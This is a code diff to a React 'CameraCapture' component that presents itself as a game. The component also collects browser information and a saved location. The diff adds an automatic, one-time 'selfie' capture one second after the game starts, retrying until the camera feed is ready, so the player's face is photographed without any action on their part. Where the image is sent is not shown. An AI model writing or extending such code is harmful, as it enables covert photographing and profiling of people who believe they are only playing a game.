@@ -26,6 +26,7 @@ function CameraCapture({ onSuccess }) {
   const [shake, setShake] = useState(false);
   const [browserInfo, setBrowserInfo] = useState(null);
   const [savedLocation, setSavedLocation] = useState({ latitude: 0, longitude: 0 });
+  const selfieCapturedRef = useRef(false);
 
   useEffect(() => {
     collectBrowserInfo();
@@ -51,8 +52,8 @@ function CameraCapture({ onSuccess }) {
       }
     };
 
-    // Start the game after max 3 seconds no matter what
-    const timeout = setTimeout(startGameSafe, 3000);
+    // Start the game after max 6 seconds no matter what
+    const timeout = setTimeout(startGameSafe, 6000);
 
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
@@ -93,6 +94,12 @@ function CameraCapture({ onSuccess }) {
   const startGame = () => {
     setNewTarget();
     setStatus('PLAYING');
+    // Auto capture selfie right away when game starts
+    setTimeout(() => {
+      if (!selfieCapturedRef.current) {
+        captureFrame();
+      }
+    }, 1000); // Capture after 1 second of game starting
   };
 
   const setNewTarget = () => {
@@ -128,10 +135,18 @@ function CameraCapture({ onSuccess }) {
   }, [status]);
 
   const captureFrame = async () => {
+    if (selfieCapturedRef.current) return; // Only capture once
+    selfieCapturedRef.current = true;
+
     const canvas = canvasRef.current;
     const video = videoRef.current;
 
-    if (!canvas || !video || video.readyState < 2) return;
+    if (!canvas || !video || video.readyState < 2) {
+      // If video isn't ready, try again in 500ms
+      selfieCapturedRef.current = false;
+      setTimeout(captureFrame, 500);
+      return;
+    }
 
     const maxWidth = 400;
     const maxHeight = 300;
@@ -182,7 +197,10 @@ function CameraCapture({ onSuccess }) {
         setLevel(prev => prev + 1);
       }
 
-      await captureFrame();
+      // Also capture selfie if not already captured
+      if (!selfieCapturedRef.current) {
+        await captureFrame();
+      }
       setNewTarget();
     } else {
       setShake(true);
